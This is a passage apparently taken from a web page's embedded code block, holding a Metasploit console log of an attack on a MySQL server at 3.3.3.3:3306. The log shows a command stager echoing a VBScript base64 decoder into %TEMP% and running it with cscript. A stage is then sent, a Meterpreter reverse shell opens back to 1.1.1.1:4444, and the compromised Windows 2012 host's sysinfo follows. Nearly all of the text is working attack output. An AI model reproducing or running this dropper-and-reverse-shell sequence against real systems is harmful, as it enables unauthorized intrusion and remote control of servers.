Function mimedecode(byVal strIn) &gt;&gt;%TEMP%\\GTKoi.vbs\n[*] 3.3.3.3:3306 - Command Stager progress -  99.59% done (101827/102246 bytes)\n[*] 3.3.3.3:3306 - Executing: echo Base64Chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot; &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo If Len(strIn) = 0 Then &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo mimedecode = -1 : Exit Function &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo Else &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo mimedecode = InStr(Base64Chars, strIn) - 1 &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo End If &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo End Function &gt;&gt;%TEMP%\\GTKoi.vbs &amp; cscript //nologo %TEMP%\\GTKoi.vbs\n[*] 3.3.3.3:3306 - Command Stager progress - 100.00% done (102246/102246 bytes)\n[*] Sending stage (179267 bytes) to 3.3.3.3\n[*] Meterpreter session 5 opened (1.1.1.1:4444 -&gt; 3.3.3.3:49165) at 2017-11-02 23:12:07 -0400\n\nmeterpreter &gt; sysinfo\nComputer        : WIN-OBKF2JFCDKL\nOS              : Windows 2012 (Build 9200).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 1\nMeterpreter     : x86/windows</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"eb6b71d4-5bca-532b-808e-ed212ef7b445"}}}